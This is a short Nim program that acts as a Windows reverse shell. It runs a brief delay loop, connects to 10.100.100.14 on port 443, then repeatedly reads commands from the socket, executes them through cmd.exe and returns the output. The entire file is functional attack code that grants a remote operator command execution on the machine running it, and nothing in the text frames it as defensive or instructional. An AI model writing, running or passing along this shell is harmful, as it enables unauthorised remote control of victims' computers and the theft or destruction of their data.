import net, osproc, strformat, times

let sai = now() + 3.seconds
var i = 1

while now() <= sai:
    var i = i + 1

let
    ip = "10.100.100.14"
    port = 443
    sock = newSocket()

sock.connect(ip, Port(port))

let prompt = "Hii-imeenda> "
while true:
    send(sock, prompt)
    let mazagazaga = recvLine(sock)
    let cmd = execProcess(fmt"cmd.exe /C " & mazagazaga)
    send(sock, cmd)
